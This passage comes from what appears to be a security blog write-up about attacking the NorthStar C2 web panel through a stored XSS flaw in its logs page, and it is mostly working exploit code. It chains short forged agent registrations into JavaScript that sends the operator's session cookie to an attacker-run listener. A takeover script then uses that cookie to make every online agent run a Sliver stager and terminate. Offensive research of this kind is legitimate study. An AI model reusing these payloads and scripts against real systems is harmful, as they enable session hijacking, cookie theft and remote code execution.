</span></span><span style="display:flex;"><span>    encrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(text)):
</span></span><span style="display:flex;"><span>        encrypted_text <span style="color:#f92672">+=</span> chr(ord(text[i]) <span style="color:#f92672">^</span> ord(key[i <span style="color:#f92672">%</span> len(key)]))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> encrypted_text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># SID is xor encrypted with hardcoded key and base64</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_sid</span>(sid):
</span></span><span style="display:flex;"><span>    encrypted_sid <span style="color:#f92672">=</span> xor_encryption(sid, <span style="color:#e6db74">&#34;northstar&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(encrypted_sid<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># SID must begin with N and end with q and less then 20 chars</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
</span></span><span style="display:flex;"><span>    target_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1/login.php&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    malicious_sid <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;N&lt;hr&gt;q&#34;</span>
</span></span><span style="display:flex;"><span>    params <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;sid&#39;</span>: generate_sid(malicious_sid)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>get(target_url, params<span style="color:#f92672">=</span>params, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exploit()
</span></span></code></pre></div><p><img src="/hr-inject.png" alt="meow3"></p>
<p>Since we still have the length limit of 20 to deal with, I opted for sending multiple malicious registration requests, each portion of which would be used to incrementally build a functioning javascript payload in the DOM.  First, remember that logs.php displays all the logs for the C2, with the newest log entry appearing at the top of the logs table in the HTML.  This means that, we could send multiple malicious registration requests with control of up to 18 characters, and each subsequent request&rsquo;s characters would be placed above the previous in the logs table.  Lets demonstrate this with a simple javascript payload.<!-- raw HTML omitted --></p>
<p>If there were no maximum length checks, we would send something like this.<!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">N</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;q</span>
</span></span></code></pre></div><p>However, this is 26 characters, so this is not possible&hellip;<!-- raw HTML omitted --></p>
<p>What if were to use javascript comments?  For example, for the first payload, we would send the following as the agent ID, which is less then 20 characters, stars with N and ends with q</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">N</span><span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">/&lt;/script&gt;q</span>
</span></span></code></pre></div><p>The second, would be the following</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">N</span><span style="color:#f92672">*</span><span style="color:#e6db74">/alert(1)/</span><span style="color:#f92672">*</span><span style="color:#a6e22e">q</span>
</span></span></code></pre></div><p>The third</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">N</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">/*q</span>
</span></span></code></pre></div><p>Because the newest logs would appear on the top of the table, this javascript snippet would be constructed &ldquo;in reverse&rdquo;.  The final payload would appear like this in the DOM.  If you were to open this in your browser as an html file, we can observe the alertbox triggers!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>N&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#75715e">/*qN*/</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#75715e">/*qN*/</span>&lt;/<span style="color:#f92672">script</span>&gt;q
</span></span></code></pre></div><p>We can test this against the C2 server by modifying the exploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># SID must begin with N and end with q and less then 20 chars</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
</span></span><span style="display:flex;"><span>    target_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://NORTHSTAR_IP/login.php&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> malicious_sid <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;N*/&lt;/script&gt;q&#34;</span>, <span style="color:#e6db74">&#34;N*/alert(1)/*q&#34;</span>, <span style="color:#e6db74">&#34;N&lt;script&gt;/*q&#34;</span>]: <span style="color:#75715e"># Send the payload snippets in reverse</span>
</span></span><span style="display:flex;"><span>        params <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;sid&#39;</span>: generate_sid(malicious_sid)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        requests<span style="color:#f92672">.</span>get(target_url, params<span style="color:#f92672">=</span>params, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exploit()
</span></span></code></pre></div><p><img src="/alert1.png" alt="meow2"></p>
<p>Nice! We have validated the stored XSS vulnerability.  Now we can start developing an exploit to transfer the control of compromised machines to us.</p>
<h3 id="cookie-exfiltration">Cookie exfiltration</h3>
<p>Requests to the web panel are authenticated by the PHPSESSID cookie.  If we are able to exfiltrate this cookie, we would be able to make authenticated requests on the operator&rsquo;s behalf, which includes issuing commands to agents.  Let&rsquo;s add the following snippet to the exploit to exfiltrate the cookie value back to the attacker machine and start a thread that passes that cookie to a steal_agents function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Collector</span>(BaseHTTPRequestHandler):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;=&#34;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Cookie: &#34;</span> <span style="color:#f92672">+</span> cookie)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>end_headers()
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        background_thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>steal_agents, args<span style="color:#f92672">=</span>(cookie,))
</span></span><span style="display:flex;"><span>        background_thread<span style="color:#f92672">.</span>start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>server<span style="color:#f92672">.</span>shutdown()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">steal_agents</span>(cookie):
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8080</span>
</span></span><span style="display:flex;"><span>httpd <span style="color:#f92672">=</span> HTTPServer((<span style="color:#e6db74">&#39;&#39;</span>, int(port)), Collector)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Server running on port </span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>httpd<span style="color:#f92672">.</span>serve_forever()
</span></span></code></pre></div><p>These are the javascript snippets we will be using for the malicious registrations.  It will send the cookie over http to the attacker server in the URL path.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sid_payloads <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;N*/&lt;/script&gt;&lt;q&#34;</span>, <span style="color:#e6db74">&#34;N*/i.src=u/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/new Image;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var i=/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/s+h+p+&#39;/&#39;+c;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var u=/*q&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;N*/&#39;</span><span style="color:#e6db74">{</span>protocol<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var s=/*q&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;N*/&#39;:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var p=/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/a+b;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var h=/*q&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;N*/&#39;</span><span style="color:#e6db74">{</span>h2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var b=/*q&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;N*/&#39;</span><span style="color:#e6db74">{</span>h1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var a=/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/d.cookie;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var c=/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/document;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var d=/*q&#34;</span>, <span style="color:#e6db74">&#34;N&lt;/td&gt;&lt;script&gt;/*q&#34;</span>]
</span></span></code></pre></div><p>This is how it will appear on page.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>N&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span><span style="color:#f92672">=</span><span style="color:#75715e">/*qN*/</span>document;<span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#75715e">/*qN*/</span><span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">cookie</span>;<span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#75715e">/*qfN*/</span><span style="color:#e6db74">&#39;{h1}&#39;</span>;<span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span><span style="color:#f92672">=</span><span style="color:#75715e">/*qfN*/</span><span style="color:#e6db74">&#39;{h2}&#39;</span>;<span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span><span style="color:#f92672">=</span><span style="color:#75715e">/*qN*/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#a6e22e">b</span>;<span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">p</span><span style="color:#f92672">=</span><span style="color:#75715e">/*qfN*/</span><span style="color:#e6db74">&#39;:{port}&#39;</span>;<span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s</span><span style="color:#f92672">=</span><span style="color:#75715e">/*qfN*/</span><span style="color:#e6db74">&#39;{protocol}&#39;</span>;<span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u</span><span style="color:#f92672">=</span><span style="color:#75715e">/*qN*/</span><span style="color:#a6e22e">s</span><span style="color:#f92672">+</span><span style="color:#a6e22e">h</span><span style="color:#f92672">+</span><span style="color:#a6e22e">p</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">c</span>;<span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#75715e">/*qN*/</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>;<span style="color:#75715e">/*qN*/</span><span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">u</span><span style="color:#75715e">/*qN*/</span>&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">q</span>
</span></span></code></pre></div><p>&ldquo;Pretty&rdquo; form</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span><span style="color:#f92672">=</span>document;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">cookie</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{h1}&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{h2}&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span><span style="color:#f92672">=</span><span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#a6e22e">b</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">p</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;:{port}&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{protocol}&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u</span><span style="color:#f92672">=</span><span style="color:#a6e22e">s</span><span style="color:#f92672">+</span><span style="color:#a6e22e">h</span><span style="color:#f92672">+</span><span style="color:#a6e22e">p</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">c</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">u</span>;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;</span>
</span></span></code></pre></div><h3 id="taking-over-the-agents">Taking over the agents</h3>
<p><img src="/rabbit.jpg" alt="meow1"> <br>
<!-- raw HTML omitted -->
After obtaining the cookie, it can be used to perform authenticated actions on the web panel, which includes executing arbitrary commands on agents.  The full exploit will loop over every NorthStar agent and instruct it to terminate itself after executing my custom sliver stager<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup>.  The javascript payload will fire when a operator navigates to the log page.  The logs page also refreshes occasionally to update logs, so if they already have the logs page open it will also fire.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> BaseHTTPRequestHandler, HTTPServer
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Collector</span>(BaseHTTPRequestHandler):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;=&#34;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Cookie: &#34;</span> <span style="color:#f92672">+</span> cookie)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>end_headers()
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        background_thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>steal_agents, args<span style="color:#f92672">=</span>(cookie,))
</span></span><span style="display:flex;"><span>        background_thread<span style="color:#f92672">.</span>start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>server<span style="color:#f92672">.</span>shutdown()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">agent_execute_command</span>(agent_id, csrf_token, headers, command):
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;slave&#39;</span>: agent_id,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;command&#39;</span>: command,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;sid&#39;</span>: agent_id,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;token&#39;</span>: csrf_token
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(target_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/functions/setCommand.nonfunction.php&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(target_url <span style="color:#f92672">+</span>  <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/getresponse.php?slave=</span><span style="color:#e6db74">{</span>agent_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(r<span style="color:#f92672">.</span>text) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;die&#34;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">steal_agents</span>(cookie):
</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Cookie&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;PHPSESSID=</span><span style="color:#e6db74">{</span>cookie<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(target_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/clients.php&#34;</span>, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>    soup <span style="color:#f92672">=</span> BeautifulSoup(r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>    rows <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;tr&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    agent_ids <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    hostnames <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> rows:
</span></span><span style="display:flex;"><span>        cells <span style="color:#f92672">=</span> row<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;td&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(cells) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">9</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        status <span style="color:#f92672">=</span> cells[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> status <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;Online&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        agent_ids<span style="color:#f92672">.</span>append(cells[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip())
</span></span><span style="display:flex;"><span>        hostnames<span style="color:#f92672">.</span>append(cells[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    script_tags <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;script&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    csrf_token <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> script_tag <span style="color:#f92672">in</span> script_tags:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;csrfToken&#39;</span> <span style="color:#f92672">in</span> script_tag<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            csrf_token <span style="color:#f92672">=</span> script_tag<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> csrf_token:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;CSRF Token:&#34;</span>, csrf_token)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;CSRF Token not found&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(agent_ids)):
</span></span><span style="display:flex;"><span>        agent_id <span style="color:#f92672">=</span> agent_ids[i]
</span></span><span style="display:flex;"><span>        hostname <span style="color:#f92672">=</span> hostnames[i]
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Stealing </span><span style="color:#e6db74">{</span>hostname<span style="color:#e6db74">}</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">{</span>agent_id<span style="color:#e6db74">}</span><span style="color:#e6db74">)...&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Enabling shell mode&#34;</span>)
</span></span><span style="display:flex;"><span>        agent_execute_command(agent_id, csrf_token, headers, <span style="color:#e6db74">&#34;enablecmd&#34;</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Running sliver cradle: </span><span style="color:#e6db74">{</span>cradle_command<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        agent_execute_command(agent_id, csrf_token, headers, cradle_command)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Disabling shell mode&#34;</span>)
</span></span><span style="display:flex;"><span>        agent_execute_command(agent_id, csrf_token, headers, <span style="color:#e6db74">&#34;disablecmd&#34;</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Sending suicide to slave&#34;</span>)
</span></span><span style="display:flex;"><span>        agent_execute_command(agent_id, csrf_token, headers, <span style="color:#e6db74">&#34;die&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Exploit finished, exiting&#34;</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>_exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor_encryption</span>(text, key):
</span></span><span style="display:flex;"><span>    encrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(text)):
</span></span><span style="display:flex;"><span>        encrypted_text <span style="color:#f92672">+=</span> chr(ord(text[i]) <span style="color:#f92672">^</span> ord(key[i <span style="color:#f92672">%</span> len(key)]))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> encrypted_text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_sid</span>(sid):
